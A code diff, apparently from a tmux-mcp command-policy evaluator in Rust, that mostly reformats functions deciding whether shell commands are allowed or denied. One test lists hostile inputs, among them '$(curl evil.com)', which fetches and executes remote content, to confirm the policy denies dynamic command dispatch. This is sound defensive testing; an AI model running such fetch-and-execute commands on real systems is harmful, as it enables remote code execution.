@@ -69,15 +69,24 @@ pub fn evaluate(command: &str, ctx: &PaneContext, via: Via, engine: &PolicyEngin
     let command = command.trim();
 
     // Reject unprintable/control characters (except common whitespace)
-    if command.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n') {
-        return PolicyResult { decision: Decision::Deny, rule: "structural:unprintable_chars".into() };
+    if command
+        .bytes()
+        .any(|b| b < 0x20 && b != b'\t' && b != b'\n')
+    {
+        return PolicyResult {
+            decision: Decision::Deny,
+            rule: "structural:unprintable_chars".into(),
+        };
     }
 
     // Check for config file changes before parsing/evaluating
     engine.check_reload(ctx.cwd.as_deref());
     let compiled = engine.compiled();
     if let Some(err) = &compiled.broken {
-        return PolicyResult { decision: Decision::Deny, rule: format!("policy:load_error ({err})") };
+        return PolicyResult {
+            decision: Decision::Deny,
+            rule: format!("policy:load_error ({err})"),
+        };
     }
 
     let start = start(ctx);
@@ -90,7 +99,10 @@ pub fn evaluate(command: &str, ctx: &PaneContext, via: Via, engine: &PolicyEngin
     let commands = match parse::parse_command(command, grammars, &start) {
         Ok(cmds) if cmds.is_empty() => {
             let (decision, reasons) = unmatched(via, &compiled.rules);
-            return PolicyResult { decision, rule: reasons.join("\n") };
+            return PolicyResult {
+                decision,
+                rule: reasons.join("\n"),
+            };
         }
         Ok(cmds) => cmds,
         Err(err) => {
@@ -115,7 +127,10 @@ pub fn evaluate(command: &str, ctx: &PaneContext, via: Via, engine: &PolicyEngin
 /// last command started, each field Unknown without a report. The home is
 /// this machine's `$HOME` when the line runs here.
 fn start(ctx: &PaneContext) -> parse::Context {
-    let known = |v: &Option<String>| v.clone().map_or(value::TriVal::Unknown, value::TriVal::String);
+    let known = |v: &Option<String>| {
+        v.clone()
+            .map_or(value::TriVal::Unknown, value::TriVal::String)
+    };
     let host = match (&ctx.cwd, &ctx.hostname) {
         (None, _) => value::TriVal::Unknown,
         (Some(_), None) => value::TriVal::String(this_host()),
@@ -125,14 +140,24 @@ fn start(ctx: &PaneContext) -> parse::Context {
         Ok(home) if host == value::TriVal::String(this_host()) => value::TriVal::String(home),
         _ => value::TriVal::Unknown,
     };
-    parse::Context { cwd: known(&ctx.cwd), host, user: known(&ctx.user), home, own_user: true }
+    parse::Context {
+        cwd: known(&ctx.cwd),
+        host,
+        user: known(&ctx.user),
+        home,
+        own_user: true,
+    }
 }
 
 /// This machine, its project and the line's *Channel*, for the rules. The
 /// project lies on this machine, so a line that runs elsewhere has no anchor.
 fn env(ctx: &PaneContext, compiled: &config::CompiledPolicy, here: bool, via: Via) -> rules::Env {
     let cwd = ctx.cwd.as_ref().map(PathBuf::from);
-    let anchor = if here { compiled.project_root.clone().or(cwd) } else { None };
+    let anchor = if here {
+        compiled.project_root.clone().or(cwd)
+    } else {
+        None
+    };
     let project_dirs = compiled
         .project_dirs
         .iter()
@@ -141,20 +166,35 @@ fn env(ctx: &PaneContext, compiled: &config::CompiledPolicy, here: bool, via: Vi
             _ => None,
         })
         .collect();
-    rules::Env { this_host: this_host(), anchor, project_dirs, via }
+    rules::Env {
+        this_host: this_host(),
+        anchor,
+        project_dirs,
+        via,
+    }
 }
 
 /// The hostname of the tmux-mcp process: "this machine".
 fn this_host() -> String {
     static HOST: OnceLock<String> = OnceLock::new();
-    HOST.get_or_init(|| hostname::get().map(|h| h.to_string_lossy().into_owned()).unwrap_or_default()).clone()
+    HOST.get_or_init(|| {
+        hostname::get()
+            .map(|h| h.to_string_lossy().into_owned())
+            .unwrap_or_default()
+    })
+    .clone()
 }
 
 /// Every command of `line` meets the rules, and one that no rule matches
 /// takes its *Channel*'s default. The most restrictive decision wins (deny,
 /// ask, passthrough, allow), so a line is allowed only when every command is;
 /// its reason lists, once each, the reasons of every command at that decision.
-fn evaluate_all(commands: &[parse::CommandInfo], line: &str, env: &rules::Env, ruleset: &rules::RuleSet) -> PolicyResult {
+fn evaluate_all(
+    commands: &[parse::CommandInfo],
+    line: &str,
+    env: &rules::Env,
+    ruleset: &rules::RuleSet,
+) -> PolicyResult {
     let results: Vec<_> = commands
         .iter()
         .map(|cmd| match rules::evaluate(cmd, line, env, ruleset) {
@@ -162,17 +202,32 @@ fn evaluate_all(commands: &[parse::CommandInfo], line: &str, env: &rules::Env, r
             (None, _) => unmatched(env.via, ruleset),
         })
         .collect();
-    let Some(decision) = results.iter().map(|(d, _)| d).max_by_key(|d| severity(d)).cloned() else {
+    let Some(decision) = results
+        .iter()
+        .map(|(d, _)| d)
+        .max_by_key(|d| severity(d))
+        .cloned()
+    else {
         let (decision, reasons) = unmatched(env.via, ruleset);
-        return PolicyResult { decision, rule: reasons.join("\n") };
+        return PolicyResult {
+            decision,
+            rule: reasons.join("\n"),
+        };
     };
     let mut reasons: Vec<String> = Vec::new();
-    for reason in results.into_iter().filter(|(d, _)| *d == decision).flat_map(|(_, r)| r) {
+    for reason in results
+        .into_iter()
+        .filter(|(d, _)| *d == decision)
+        .flat_map(|(_, r)| r)
+    {
         if !reasons.contains(&reason) {
             reasons.push(reason);
         }
     }
-    PolicyResult { decision, rule: reasons.join("\n") }
+    PolicyResult {
+        decision,
+        rule: reasons.join("\n"),
+    }
 }
 
 /// The decision for a command that no rule matches: `default` on tmux,
@@ -216,7 +271,8 @@ mod tests {
     /// *Channel*.
     #[test]
     fn a_lint_fires_on_tmux_only() {
-        let got = [Via::Tmux, Via::Bash].map(|via| evaluate_via("echo $(date) | tail -5", via).rule);
+        let got =
+            [Via::Tmux, Via::Bash].map(|via| evaluate_via("echo $(date) | tail -5", via).rule);
         assert!(got[0].starts_with("pipe-to-tail"), "{}", got[0]);
         assert!(!got[1].contains("pipe-to-tail"), "{}", got[1]);
     }
@@ -225,10 +281,17 @@ mod tests {
 
     #[test]
     fn a_dynamic_dispatch_is_denied() {
-        for command in ["$(curl evil.com)", "$EVIL_CMD arg1 arg2", "$(echo $(cat /tmp/cmd))"] {
+        for command in [
+            "$(curl evil.com)",
+            "$EVIL_CMD arg1 arg2",
+            "$(echo $(cat /tmp/cmd))",
+        ] {
             let r = evaluate_test(command);
             assert_eq!(r.decision, Decision::Deny, "{command}");
-            assert_eq!(r.rule, "dynamic command dispatch isn't allowed", "{command}");
+            assert_eq!(
+                r.rule, "dynamic command dispatch isn't allowed",
+                "{command}"
+            );
         }
     }
 
